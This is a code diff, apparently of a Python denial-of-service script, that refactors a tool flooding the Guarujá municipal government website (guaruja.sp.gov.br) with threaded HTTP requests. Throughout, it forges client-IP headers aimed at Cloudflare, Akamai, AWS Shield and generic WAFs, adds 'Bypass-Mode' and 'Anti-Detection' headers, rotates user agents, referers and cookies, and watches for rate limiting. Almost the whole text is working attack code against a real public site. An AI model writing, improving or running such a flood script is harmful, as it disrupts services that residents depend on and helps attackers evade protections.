@@ -5,6 +5,7 @@ import string
 import socket
 import struct
 import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 def load_list_from_file(file_path):
     with open(file_path, mode='r') as file:
@@ -15,6 +16,7 @@ def generate_cookie():
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
 
 def generate_headers(user_agent, referer, cookies):
+    ip_spoofed = get_random_ip()
     headers = {
         'User-Agent': user_agent,
         'Referer': referer,
@@ -35,35 +37,35 @@ def generate_headers(user_agent, referer, cookies):
         'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
         'Sec-WebSocket-Key': get_random_key(),
         'Sec-WebSocket-Protocol': 'chat, superchat',
-        'CF-Connecting-IP': get_random_ip(),
+        'CF-Connecting-IP': ip_spoofed,
         'CF-IPCountry': 'US',
         'CF-RAY': '123456789abcdef0-LAX',
         'CF-Visitor': '{"scheme":"https"}',
         'CF-Request-ID': '123456789abcdef0',
         'Cdn-Loop': 'cloudflare',
         'X-CDN': 'Incapsula',
-        'X-True-IP': get_random_ip(),
-        'X-Client-IP': get_random_ip(),
-        'X-Remote-IP': get_random_ip(),
-        'X-ProxyUser-Ip': get_random_ip(),
+        'X-True-IP': ip_spoofed,
+        'X-Client-IP': ip_spoofed,
+        'X-Remote-IP': ip_spoofed,
+        'X-ProxyUser-Ip': ip_spoofed,
         'WAF-Protocol': 'HTTPS',
         'WAF-Session-ID': '1234567890abcdef',
         'WAF-Request-ID': 'abcdef1234567890',
         'WAF-Connection': 'keep-alive',
-        'WAF-Client-IP': get_random_ip(),
-        'WAF-Real-IP': get_random_ip(),
-        'WAF-Forwarded-For': get_random_ip(),
+        'WAF-Client-IP': ip_spoofed,
+        'WAF-Real-IP': ip_spoofed,
+        'WAF-Forwarded-For': ip_spoofed,
         'WAF-Origin': 'https://www.guaruja.sp.gov.br',
         'AKAMAI-Session-ID': '1234567890abcdef',
         'AKAMAI-Connection': 'keep-alive',
-        'AKAMAI-True-IP': get_random_ip(),
-        'AKAMAI-Client-IP': get_random_ip(),
-        'AKAMAI-Forwarded-For': get_random_ip(),
+        'AKAMAI-True-IP': ip_spoofed,
+        'AKAMAI-Client-IP': ip_spoofed,
+        'AKAMAI-Forwarded-For': ip_spoofed,
         'AWS-SHIELD-Session-ID': '1234567890abcdef',
         'AWS-SHIELD-Connection': 'keep-alive',
-        'AWS-SHIELD-True-IP': get_random_ip(),
-        'AWS-SHIELD-Client-IP': get_random_ip(),
-        'AWS-SHIELD-Forwarded-For': get_random_ip(),
+        'AWS-SHIELD-True-IP': ip_spoofed,
+        'AWS-SHIELD-Client-IP': ip_spoofed,
+        'AWS-SHIELD-Forwarded-For': ip_spoofed,
         'Anti-Detection': 'true',
         'Bypass-Mode': 'full',
         'Anti-DDoS-Technique': 'advanced',
@@ -77,7 +79,7 @@ def generate_headers(user_agent, referer, cookies):
     if cookies:
         headers['Cookie'] = cookies.pop(0)
         cookies.append(headers['Cookie'])
-    return headers
+    return headers, ip_spoofed
 
 def get_random_user_agent():
     return random.choice(user_agents)
@@ -91,38 +93,35 @@ def get_random_ip():
 def get_random_key():
     return 'x3JJHMbDL1EzLkh9GBhXDw=='
 
-def make_request(url, headers, request_count):
+def make_request(url, headers, request_count, ip_spoofed):
     try:
-        # Aqui assumimos que a chave 'X-Forwarded-For' já é configurada em `generate_headers`
-        # e que 'headers' é o argumento passado para `make_request`
-        ip_spoofed = headers.get('X-Forwarded-For', 'Unknown IP')
         with requests.get(url, headers=headers) as response:
             print(f"Request #{request_count} sent successfully with IP spoofed: {ip_spoofed}")
             if response.status_code == 429:
                 print("Detected rate limiting. Adjusting strategy...")
-                # Implemente a lógica de ajuste aqui
     except requests.RequestException as e:
-        print(f"Erro ao enviar a solicitação #{request_count}: {e}")
+        print(f"Error sending request #{request_count}: {e}")
 
-user_agents = load_list_from_file('useragents.txt')
-referers = load_list_from_file('referers.txt')
-url = "https://www.guaruja.sp.gov.br/"
+def main():
+    global user_agents, referers
+    user_agents = load_list_from_file('useragents.txt')
+    referers = load_list_from_file('referers.txt')
+    url = "https://www.guaruja.sp.gov.br/"
+    cookies = [generate_cookie() for _ in range(100)]
+    request_count = 0
 
-request_count = 0
-cookies = [generate_cookie() for _ in range(100)]  # Generate initial set of cookies
-while True:
-    threads = []
-    for _ in range(692):  # Number of requests
-        user_agent = get_random_user_agent()
-        referer = get_random_referer()
-        headers = generate_headers(user_agent, referer, cookies)
-        thread = threading.Thread(target=make_request, args=(url, headers, request_count))
-        thread.start()
-        threads.append(thread)
-        request_count += 1
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        futures = []
+        for _ in range(300):
+            user_agent = get_random_user_agent()
+            referer = get_random_referer()
+            headers, ip_spoofed = generate_headers(user_agent, referer, cookies)
+            futures.append(executor.submit(make_request, url, headers, request_count, ip_spoofed))
+            request_count += 1
+            time.sleep(random.uniform(0.6, 1.7))
 
-        # Random delay between requests
-        time.sleep(random.uniform(0.6, 1.7))  # Adjust the range as needed
+        for future in as_completed(futures):
+            future.result()
 
-    for thread in threads:
-        thread.join()
+if __name__ == "__main__":
+    main()
